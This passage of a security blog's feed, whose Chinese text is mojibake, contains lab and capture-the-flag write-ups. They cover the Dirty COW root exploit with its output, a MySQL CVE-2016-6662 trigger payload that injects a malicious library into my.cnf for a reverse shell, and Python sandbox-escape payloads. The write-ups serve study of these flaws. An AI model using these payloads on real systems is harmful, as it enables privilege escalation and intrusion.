href="https://github.com/scumjr/dirtycow-vdso" target="_blank" rel="noopener">https://github.com/scumjr/dirtycow-vdso</a></h3><p>è¿™ä¸ªEXPä¸ä¼šå‡ºç°ç³»ç»Ÿå´©æºƒï¼Œä½†æ˜¯ä½œè€…æœ¬äººè¯´ä¸é€‚ç”¨äºæ‰€æœ‰linuxç‰ˆæœ¬ï¼Œä¸è¿‡è¯•éªŒäº†ä¸€ä¸‹ï¼Œubuntu14 16 centOS7éƒ½å¯ä»¥<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">okami@ubuntu14:~$ ./0xdeadbeef</span><br><span class="line">[*] exploit: patch 1/2</span><br><span class="line">[*] vdso successfully backdoored</span><br><span class="line">[*] exploit: patch 2/2</span><br><span class="line">[*] vdso successfully backdoored</span><br><span class="line">[*] waiting for reverse connect shell...</span><br><span class="line">[*] enjoy!</span><br><span class="line">[*] restore: patch 2/2</span><br><span class="line">[*] vdso successfully restored</span><br><span class="line">[*] restore: patch 1/2</span><br><span class="line">[*] vdso successfully restored</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID:Ubuntu</span><br><span class="line">Description:Ubuntu 14.04.5 LTS</span><br><span class="line">Release:14.04</span><br><span class="line">Codename:trusty</span><br></pre></td></tr></table></figure></p><p>æ³¨æ„è¿™é‡Œæœ‰ä¸€æ­¥æ˜¯waiting for reverse connect shellâ€¦ï¼Œéœ€è¦ä¸€ç‚¹æ—¶é—´ï¼ŒæˆåŠŸåæœ‰rootæƒé™çš„shell</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;æ¦‚è¿°&quot;&gt;&lt;a href=&quot;#æ¦‚è¿°&quot; class=&quot;headerlink&quot; title=&quot;æ¦‚è¿°&quot;&gt;&lt;/a&gt;æ¦‚è¿°&lt;/h1&gt;&lt;p&gt;æœ€è¿‘å‡ºæ¥çš„dirtycowï¼Œå½±å“ç‰ˆæœ¬:Linux kernel &amp;gt;= 2.6.22ï¼ˆ2007å¹´å‘è¡Œï¼Œåˆ°ä»Šå¹´10æœˆ18æ—¥æ‰ä¿®å¤ï¼‰,ç”¨ç½‘ä¸Šçš„EXPè¯•äº†ä¸€ä¸‹ï¼Œè®°å½•ä¸€ä¸‹è¿‡ç¨‹&lt;br&gt;
    
    </summary>
    
      <category term="notes" scheme="http://blog.0kami.cn/categories/notes/"/>
    
    
      <category term="cve" scheme="http://blog.0kami.cn/tags/cve/"/>
    
  </entry>
  
  <entry>
    <title>ã€CVE-2016-6662ã€‘MYSQLææƒåˆ†æ</title>
    <link href="http://blog.0kami.cn/2016/09/18/old-cve-2016-6663-mysql-exp/"/>
    <id>http://blog.0kami.cn/2016/09/18/old-cve-2016-6663-mysql-exp/</id>
    <published>2016-09-18T00:53:47.000Z</published>
    <updated>2018-01-25T07:15:50.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><p>å‡ å¤©å‰å‡ºäº†mysqlæœ¬åœ°ææƒçš„0dayï¼Œè™½ç„¶ç°åœ¨å®˜æ–¹å·²ç»å‡ºäº†è¡¥ä¸ï¼Œä½†æ˜¯å—å½±å“çš„ä¸»æœºè¿˜æ˜¯æŒºå¤šçš„ã€‚è·Ÿè¿›æ“ä½œä¸€éï¼šï¼‰</p><a id="more"></a><h1 id="æ¼æ´å½±å“"><a href="#æ¼æ´å½±å“" class="headerlink" title="æ¼æ´å½±å“"></a>æ¼æ´å½±å“</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MySQL  &lt;= 5.7.15       è¿œç¨‹ä»£ç æ‰§è¡Œ/ ææƒ (0day)</span><br><span class="line">        5.6.33</span><br><span class="line">        5.5.52</span><br><span class="line"></span><br><span class="line">Mysqlåˆ†æ”¯çš„ç‰ˆæœ¬ä¹Ÿå—å½±å“,åŒ…æ‹¬ï¼š</span><br><span class="line">    MariaDB</span><br><span class="line">    PerconaDB</span><br></pre></td></tr></table></figure><h1 id="å®éªŒåˆ†æ"><a href="#å®éªŒåˆ†æ" class="headerlink" title="å®éªŒåˆ†æ"></a>å®éªŒåˆ†æ</h1><p>è¿™æ¬¡å®éªŒä¸»è¦ä½¿ç”¨dockeræ­å»ºç¯å¢ƒï¼Œæœ‰éœ€è¦çš„åŒå­¦å¯ä»¥pullæˆ‘çš„åº“ç©<a href="https://hub.docker.com/r/0kami/vulevn/tags/" target="_blank" rel="noopener">0kami/vulenv:cve-2016-6663</a><br>å®éªŒä¸»è¦ä»attackerçš„è§’åº¦å…¥æ‰‹ï¼Œé¢„å…ˆæ‹¥æœ‰çš„æƒé™ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql è´¦æˆ·æ‹¥æœ‰fileæƒé™ bob/bob</span><br><span class="line">exp mysql_hookandroot_lib.c</span><br><span class="line">mysql-server-5.6</span><br><span class="line">my.cnfå¯è¢«mysqlç»„æ”¹å†™å†™</span><br></pre></td></tr></table></figure></p><p>å…ˆæŸ¥çœ‹ä¸€ä¸‹ç‰ˆæœ¬ä¿¡æ¯<br><img src="../../../../img/cve-2016-6662/pic1.png" alt=""><br>å°†<code>/etc/mysql/my.cnf</code>æƒé™ä¿®æ”¹æ‰<br><img src="../../../../img/cve-2016-6662/pic2.png" alt=""><br>åˆ›å»ºbobç”¨æˆ·ï¼Œå¹¶èµ‹äºˆfileï¼Œselectï¼Œinsertæƒé™ï¼Œåˆ›å»ºç”¨äºå®éªŒçš„æ•°æ®åº“activedbå’Œè¡¨active_table<br><img src="../../../../img/cve-2016-6662/pic3.png" alt=""><br><img src="../../../../img/cve-2016-6662/pic4.png" alt=""><br>å°†expå…ˆå†™å…¥tmpç›®å½•ï¼Œå¹¶ç¼–è¯‘æˆsoæ–‡ä»¶ï¼Œéœ€è¦ä¿®æ”¹ä¸€ä¸‹ipï¼Œportå’Œmy.cnfçš„ä½ç½®<br><img src="../../../../img/cve-2016-6662/pic5.png" alt=""><br><code>gcc -Wall -fPIC -shared -o mysql_hookandroot_lib.c.so mysql_hookandroot_lib.c.c -ldl</code><br><img src="../../../../img/cve-2016-6662/pic6.png" alt=""><br>æœ€åä¸€æ­¥å°±æ˜¯å‡†å¤‡ä¸€ä¸‹active_tableçš„è§¦å‘å™¨äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç°åœ¨è‡ªå·±ç”µè„‘ä¸Šrootç”¨æˆ·æƒé™ä¸‹ç”Ÿæˆä¸€ä¸ªtragger<br><img src="../../../../img/cve-2016-6662/pic7.png" alt=""><br>åœ¨activedbæ•°æ®ä¸‹ä¼šç”Ÿæˆä¸€ä¸ªè§¦å‘å™¨<br><img src="../../../../img/cve-2016-6662/pic8.png" alt=""><br>åˆ°æ­¤ä½ç½®æˆ‘ä»¬æ‰€æœ‰çš„å‡†å¤‡å·¥ä½œéƒ½åšå¥½äº†ã€‚è®©æˆ‘ä»¬ç”¨bobç”¨æˆ·æ¥å¼¹ä¸ªshellå§<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;TYPE=TRIGGERS\ntriggers=&apos;CREATE DEFINER=`root`@`localhost` TRIGGER active_table\nAFTER INSERT\n   ON `active_table` FOR EACH ROW\nBEGIN\n   DECLARE void varchar(550);\n   set global general_log_file=\\\&apos;/etc/mysql/my.cnf\\\&apos;;\n   set global general_log = on;\n   select \&quot;\n[mysqld]\nmalloc_lib=\\\&apos;/tmp/mysql_hookandroot_lib.so\\\&apos;\n\&quot; INTO void;   \n   set global general_log = off;\nEND&apos;\nsql_modes=1073741824\ndefiners=&apos;root@localhost&apos;\nclient_cs_names=&apos;latin1&apos;\nconnection_cl_names=&apos;latin1_swedish_ci&apos;\ndb_cl_names=&apos;latin1_swedish_ci&apos;&quot; into dumpfile &apos;/var/lib/mysql/activedb/active_table.TRG&apos;;</span><br></pre></td></tr></table></figure></p><p>ç”¨bobçš„ç”¨æˆ·å†™å…¥æ–‡ä»¶äº§ç”Ÿä¸€ä¸ªè§¦å‘å™¨ï¼Œè¿™ä¸ªè§¦å‘å™¨å½“äº§ç”Ÿinsertæ—¶è§¦å‘<br><img src="../../../../img/cve-2016-6662/pic9.png" alt=""><br>æ¥æŸ¥çœ‹ä¸€ä¸‹ï¼Œæ‰§è¡Œåçš„<code>/etc/mysql/my.cnf</code>çš„å†…å®¹<br><img src="../../../../img/cve-2016-6662/pic10.png" alt=""><br>é‡å¯ä¸€ä¸‹æ•°æ®åº“ï¼Œåå¼¹ä¸€ä¸ªshell<br>å‘ç°å¯å†™çš„my.cnfä¼šè¢«å¿½ç•¥ï¼Ÿï¼Ÿï¼Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼ˆéš¾é“æ‰“è¡¥ä¸äº†ï¼Ÿï¼‰ï¼Œä¸çŸ¥é“5.5çš„æƒ…å†µä¼šæ€ä¹ˆæ ·ï¼Œæ‰€ä»¥å…ˆæŠŠmy.cnfçš„æƒé™æ”¹å›æ¥744<br><img src="../../../../img/cve-2016-6662/pic11.png" alt=""><br><img src="../../../../img/cve-2016-6662/pic12.png" alt=""><br>æˆåŠŸåå¼¹ä¸€ä¸ªshellï¼Œè¿™è¾¹è¿”å›çš„ä¸€ä¸ªshellæ˜¯mysqlæƒé™çš„ æ˜¯å› ä¸ºæˆ‘æµ‹è¯•çš„ç¯å¢ƒmysqld_safeæ˜¯ä»¥mysqlæƒé™è¿è¡Œçš„ï¼Œæ‰€ä»¥å¼¹å‡ºæ¥çš„æƒé™æ˜¯mysqlçš„ï¼Œä½†æ˜¯å¦‚æœmysqld_safeæ˜¯ä»¥rootæƒé™è¿è¡Œï¼Œé‚£ä¹ˆåå¼¹çš„shellå°±æ˜¯rootæƒé™çš„ï¼Œé€ æˆææƒã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æµ‹è¯•ç¯å¢ƒæ­å»ºè¿˜æœ‰åˆ©ç”¨è¿‡ç¨‹è¿˜æ˜¯å‡ºç°äº†å¾ˆå¤šé—®é¢˜ï¼Œå¯å†™çš„my.cnfä¼šè¢«å¿½ç•¥è½½å…¥ï¼ˆä¸çŸ¥é“æ˜¯ä¸æ˜¯å› ä¸ºä¿®å¤è¿‡çš„åŸå› ï¼‰ï¼Œtriggersçš„åˆ©ç”¨ï¼ˆå¯ä»¥åŒæ ·åˆ©ç”¨åœ¨æ‹¥æœ‰fileæƒé™çš„æƒ…å†µä¸‹æå‡æƒé™ï¼Œè¿™ä¸ªåˆ°æ—¶å€™å†æ·±å…¥å­¦ä¹ ä¸€ä¸‹ï¼‰</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;æ¦‚è¿°&quot;&gt;&lt;a href=&quot;#æ¦‚è¿°&quot; class=&quot;headerlink&quot; title=&quot;æ¦‚è¿°&quot;&gt;&lt;/a&gt;æ¦‚è¿°&lt;/h1&gt;&lt;p&gt;å‡ å¤©å‰å‡ºäº†mysqlæœ¬åœ°ææƒçš„0dayï¼Œè™½ç„¶ç°åœ¨å®˜æ–¹å·²ç»å‡ºäº†è¡¥ä¸ï¼Œä½†æ˜¯å—å½±å“çš„ä¸»æœºè¿˜æ˜¯æŒºå¤šçš„ã€‚è·Ÿè¿›æ“ä½œä¸€éï¼šï¼‰&lt;/p&gt;
    
    </summary>
    
      <category term="notes" scheme="http://blog.0kami.cn/categories/notes/"/>
    
    
      <category term="cve" scheme="http://blog.0kami.cn/tags/cve/"/>
    
  </entry>
  
  <entry>
    <title>ã€VULNERABLITYã€‘python sandbox escape</title>
    <link href="http://blog.0kami.cn/2016/09/16/old-python-sandbox-escape/"/>
    <id>http://blog.0kami.cn/2016/09/16/old-python-sandbox-escape/</id>
    <published>2016-09-16T03:33:11.000Z</published>
    <updated>2018-01-25T07:27:54.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><p>å‰å‡ å¤©çš„åå±±æ¯å‡ºäº†ä¸€é“pythonçš„æ²™ç›’é€ƒé€¸ï¼Œæ„Ÿè§‰æŒºæœ‰æ„æ€çš„ã€‚åœ¨ç½‘ä¸Šæœç´¢äº†ä¸€ä¸‹ï¼Œå‘ç°å¾ˆæ—©å°±å‡ºè¿‡è¿™ç§ç±»å‹çš„é¢˜ï¼Œæºç éƒ½å·®ä¸å¤šã€‚å­¦ä¹ äº†ä¸€ä¸‹æ€è·¯ï¼Œè¿™é‡Œæ€»ç»“ä¸€ä¸‹ï¼šï¼‰</p><a id="more"></a><h1 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h1><p>æ²™ç›’æºç å¦‚ä¸‹ï¼š<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Welcome to my Python sandbox! Enter commands below!"</span>)</span><br><span class="line"></span><br><span class="line">banned = [  </span><br><span class="line">    <span class="string">"import"</span>,</span><br><span class="line">    <span class="string">"exec"</span>,</span><br><span class="line">    <span class="string">"eval"</span>,</span><br><span class="line">    <span class="string">"pickle"</span>,</span><br><span class="line">    <span class="string">"os"</span>,</span><br><span class="line">    <span class="string">"subprocess"</span>,</span><br><span class="line">    <span class="string">"kevin sucks"</span>,</span><br><span class="line">    <span class="string">"input"</span>,</span><br><span class="line">    <span class="string">"banned"</span>,</span><br><span class="line">    <span class="string">"cry sum more"</span>,</span><br><span class="line">    <span class="string">"sys"</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">targets = __builtins__.__dict__.keys()  </span><br><span class="line">targets.remove(<span class="string">'raw_input'</span>)  </span><br><span class="line">targets.remove(<span class="string">'print'</span>)  </span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> targets:<span class="comment"># å»é™¤æ‰€æœ‰å†…ç½®å‡½æ•°é™¤print raw_input</span></span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[x]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:  </span><br><span class="line">    print(<span class="string">"&gt;&gt;&gt;"</span>, end=<span class="string">' '</span>)</span><br><span class="line">    data = raw_input()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> banned:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> data.lower():</span><br><span class="line">            print(<span class="string">"No bueno"</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment"># this means nobreak</span></span><br><span class="line">        <span class="keyword">exec</span> data</span><br></pre></td></tr></table></figure></p><p>ä¸èƒ½å‡ºç°bannedåˆ—è¡¨ä¸­çš„å­—ç¬¦ï¼Œä½†æ˜¯éœ€è¦è¯»å–flagæ–‡ä»¶å†…å®¹ã€‚</p><h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><p>ç»•è¿‡å‰é¢çš„é™åˆ¶ï¼Œæˆ‘ä»¬æ¥ä¸€æ­¥ä¸€æ­¥çœ‹payload</p><h3 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__</span><br><span class="line">&lt;type &apos;list&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; &#123;&#125;.__class__</span><br><span class="line">&lt;type &apos;dict&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; ().__class__</span><br><span class="line">&lt;type &apos;tuple&apos;&gt;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆpythonçš„å†…ç½®å¯¹è±¡æœ‰ä¸€ä¸ª<strong>class</strong>å±æ€§æ¥å­˜å‚¨ç±»å‹ï¼Œæˆ‘ä»¬å¾€ä¸Šæ‰¾ä»–çš„çˆ¶ç±»ä½¿ç”¨<strong>base</strong>å±æ€§<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#123;&#125;.__class__.__base__</span><br><span class="line">&lt;type &apos;object&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; ().__class__.__base__</span><br><span class="line">&lt;type &apos;object&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__</span><br><span class="line">&lt;type &apos;object&apos;&gt;</span><br></pre></td></tr></table></figure></p><p>å¯ä»¥çœ‹åˆ°è¿”å›objectå¯¹è±¡ï¼Œå› ä¸ºpythonä¸­ä¸€åˆ‡å‡ä¸ºå¯¹è±¡ï¼Œå‡ç»§æ‰¿objectå¯¹è±¡ï¼Œå¾—åˆ°objectä¹‹åæˆ‘ä»¬å°±å¯åœ¨é€šè¿‡å±æ€§<strong>subclasses</strong>æ¥æŸ¥çœ‹objectçš„å­ç±»ï¼ˆåŒ…æ‹¬æ‰€æœ‰çš„å†…ç½®ç±»ï¼‰<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()</span><br><span class="line">[&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;PyCapsule&apos;&gt;, &lt;type &apos;cell&apos;&gt;, &lt;type &apos;callable-iterator&apos;&gt;, &lt;type &apos;iterator&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;fieldnameiterator&apos;&gt;, &lt;type &apos;formatteriterator&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;posix.stat_result&apos;&gt;, &lt;type &apos;posix.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;type &apos;dict_keys&apos;&gt;, &lt;type &apos;dict_items&apos;&gt;, &lt;type &apos;dict_values&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;]</span><br></pre></td></tr></table></figure></p><p>å›åˆ°æˆ‘ä»¬çš„ä¸»è¦ç›®çš„ä¸Šï¼Œæˆ‘ä»¬éœ€è¦è¯»å–flagæ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œåœ¨è¿™äº›å­ç±»ä¸­æœ‰å“ªäº›æ˜¯å¯ä»¥ç”¨æ¥è¯»å–æ–‡ä»¶å†…å®¹çš„å‘¢ï¼Ÿç­”æ¡ˆæ˜¯fileå­ç±»ï¼Œé¦–å…ˆæŸ¥æ‰¾ä¸€ä¸‹fileå­ç±»çš„ä½ç½®ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__().index(file)</span><br><span class="line">40</span><br></pre></td></tr></table></figure></p><p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿™ä¸ªæ¥å»ºç«‹ä¸€ä¸ªfileç±»çš„åˆ«åè¯»æ–‡ä»¶å•¦ï¼šï¼‰<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f=[].__class__.__base__.__subclasses__()[40]</span><br><span class="line">&gt;&gt;&gt; f(&apos;./flag.txt&apos;).read()</span><br></pre></td></tr></table></figure></p><p>ï¼Ÿï¼Ÿï¼Ÿæ²¡æœ‰ä»»ä½•å†…å®¹æ‰“å°å‡ºæ¥ï¼Œä½†æ˜¯ä»–æ²¡æœ‰æŠ¥é”™è¯´æ˜å­˜åœ¨flag.txtæ–‡ä»¶ï¼Œæˆ‘ä»¬å°è¯•ç”¨ä»–ç»™çš„printå‡½æ•°æ¥æ‰“å°<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(f(&apos;./flag.txt&apos;).read())</span><br><span class="line">This is a Flag&#123;enjoy_yourself_ctfer&#125;</span><br></pre></td></tr></table></figure></p><p>å¾—åˆ°flag</p><h3 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h3><p>åŒæ ·çš„è¿˜æœ‰ä¸€ç§æ–¹æ³•å°±æ˜¯ä½¿ç”¨osæ¨¡å—æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤systemï¼Œä½†æ˜¯osè¢«å±è”½<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">No bueno</span><br></pre></td></tr></table></figure></p><p>æˆ‘ä»¬å¾—æƒ³å…¶ä»–åŠæ³•æ¥è·å–shellã€‚é€šè¿‡ä¸Šé¢çš„æ€è·¯ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ªå­ç±»ä»–èƒ½è°ƒç”¨osæ¨¡å—ï¼Œè¿™é‡Œç”¨åˆ°äº†<code>warnings.catch_warnings</code>ç±»<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import warnings</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__().index(warnings.catch_warnings)</span><br><span class="line">59</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59]</span><br><span class="line">&lt;class &apos;warnings.catch_warnings&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()</span><br><span class="line">[&apos;filterwarnings&apos;, &apos;once_registry&apos;, &apos;WarningMessage&apos;, &apos;_show_warning&apos;, &apos;filters&apos;, &apos;_setoption&apos;, &apos;showwarning&apos;, &apos;__all__&apos;, &apos;onceregistry&apos;, &apos;__package__&apos;, &apos;simplefilter&apos;, &apos;default_action&apos;, &apos;_getcategory&apos;, &apos;__builtins__&apos;, &apos;catch_warnings&apos;, &apos;__file__&apos;, &apos;warnpy3k&apos;, &apos;sys&apos;, &apos;__name__&apos;, &apos;warn_explicit&apos;, &apos;types&apos;, &apos;warn&apos;, &apos;_processoptions&apos;, &apos;defaultaction&apos;, &apos;__doc__&apos;, &apos;linecache&apos;, &apos;_OptionError&apos;, &apos;resetwarnings&apos;, &apos;formatwarning&apos;, &apos;_getaction&apos;]</span><br></pre></td></tr></table></figure></p><p>æ¥ä¸‹æ¥å†æ‰¾<code>linecache</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys().index(&apos;linecache&apos;)</span><br><span class="line">25</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.keys()</span><br><span class="line">[&apos;updatecache&apos;, &apos;clearcache&apos;, &apos;__all__&apos;, &apos;__builtins__&apos;, &apos;__file__&apos;, &apos;cache&apos;, &apos;checkcache&apos;, &apos;getline&apos;, &apos;__package__&apos;, &apos;sys&apos;, &apos;getlines&apos;, &apos;__name__&apos;, &apos;os&apos;, &apos;__doc__&apos;]</span><br></pre></td></tr></table></figure></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå¯ä»¥è°ƒç”¨osæ¨¡å—ï¼Œæ¥ä¸‹æ¥å°±è°ƒç”¨systemå‡½æ•°äº†<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12]</span><br><span class="line">&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; 